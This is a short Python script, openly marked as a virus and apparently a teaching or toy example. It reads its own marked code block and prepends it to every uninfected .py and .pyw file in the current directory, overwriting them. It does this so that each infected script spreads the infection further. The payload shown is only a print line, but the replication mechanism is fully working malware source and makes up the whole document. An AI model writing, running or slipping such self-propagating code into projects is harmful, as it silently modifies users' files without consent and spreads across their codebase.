### THE VIRUS STARTS HERE ###

import glob, sys 

code = []

# open this file,read every lines and find the virus area
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### THE VIRUS STARTS HERE ###\n':
      virus_area = True
    if virus_area:
        code.append(line)
    if line == '### THE VIRUS ENDS HERE ###\n':
        break
#print(line)    
#print(code)
# open every files and write the replicate code

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
print(python_scripts)

for script in python_scripts: 
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### THE VIRUS STARTS HERE ###\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

# Malicious piece of code

print ('Virus is here')

### THE VIRUS ENDS HERE ###